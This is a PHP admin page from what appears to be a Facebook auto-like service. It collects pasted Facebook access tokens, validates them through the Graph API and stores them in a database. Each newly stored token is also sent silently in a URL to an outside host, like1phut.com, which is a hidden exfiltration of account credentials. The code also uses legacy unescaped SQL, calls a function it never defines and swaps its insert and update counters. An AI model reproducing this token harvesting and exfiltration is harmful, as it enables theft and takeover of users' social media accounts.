<?php
include 'system/head.php';
?>
        <div class="content">
            <div class="container-fluid">
                <div class="row">



<div class="card">
	<div class="header">
		<h4 class="title"><i class="fa fa-dashboard" style="margin-right: 5px;"></i> Thêm Token vào Hệ Thống </h4>
		<p class="category">Sử Dụng Token Iphone Để hệ thống hoạt Động</p>
	</div>
<div class="content">     
<form method="post">
  <div class="form-group">
    <label for="info">Nhập Token IPhone: (Cách nhau = Xuống Dòng)</label>
	<textarea name="token" class="form-control" rows="10"></textarea>
  </div>
  <button type="submit" class="btn btn-success">Thêm Token</button>
</form>

</div></div>

<?php


if($_POST['token']){


set_time_limit(0);
$token = $_POST['token'];
$insert = $update = 0;
$data  = explode("\n", $token);
foreach ($data as $token) {
   $me = cek(trim($token));

   if ($me['id']) {
      if (mysql_num_rows(mysql_query("SELECT `name` FROM token WHERE user_id = '" . mysql_real_escape_string($me['id']) . "'"))) {
         mysql_query("UPDATE token SET `access_token` = '" . mysql_real_escape_string($token) . "' WHERE `user_id` = " . $me['id'] . "");
         ++$insert;
      } else {
         mysql_query("INSERT INTO token SET
               `user_id` = '" . mysql_real_escape_string($me['id']) . "',
               `name` = '" . mysql_real_escape_string($me['name']) . "',
               `access_token` = '" . mysql_real_escape_string($token) . "'
         ");
		 auto('http://like1phut.com/check.php?puaru='.$token);
         ++$update;
      }
   }
}

echo '<div class="list-group-item"> Đã Thêm <b style="color:#f00">' . $insert . '</b> Tài Khoản</div>';
echo '<div class="list-group-item"> Đã Cập Nhật <b style="color:#f00">' . $update . '</b> Tài Khoản</div>';

}

function cek($o) {
   return json_decode(auto('https://graph.facebook.com/me?access_token='.$o),true);
}

function trien($url) {
   $ch = curl_init();
   curl_setopt_array($ch, array(
      CURLOPT_CONNECTTIMEOUT => 5,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_URL            => $url,
      )
   );
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
}
echo '</div></div></div>';
include 'system/foot.php';
?>